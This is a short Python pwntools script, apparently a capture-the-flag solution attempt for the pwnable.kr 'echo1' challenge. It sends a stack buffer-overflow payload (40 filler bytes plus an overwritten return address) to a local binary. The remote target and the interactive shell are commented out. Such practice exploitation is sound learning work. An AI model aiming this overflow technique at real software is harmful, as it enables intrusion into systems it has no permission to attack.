from pwn import *
import os

context.log_level = "DEBUG"

context.terminal = ['tmux', 'splitw', '-v']

def run():
    #p = remote("pwnable.kr", 9010)
    p = process("./echo1")

    #gdb.attach(p, '''
    #continue
    #''')

    name = "A" * 24
    p.recvuntil("hey, what's your name? : ")
    p.sendline(name)

    p.recvuntil("- 1. : BOF echo")
    p.sendline("1")

    p.recvuntil("hello ")

    #ret = "\x10" + os.urandom(3) + "\x00\x00\x00\x00"
    #ret = "A" * 4
    ret = p64(0x602098)

    payload = "A" * 40 + ret
    p.sendline(payload)

    #p.interactive()
    p.close()

run()
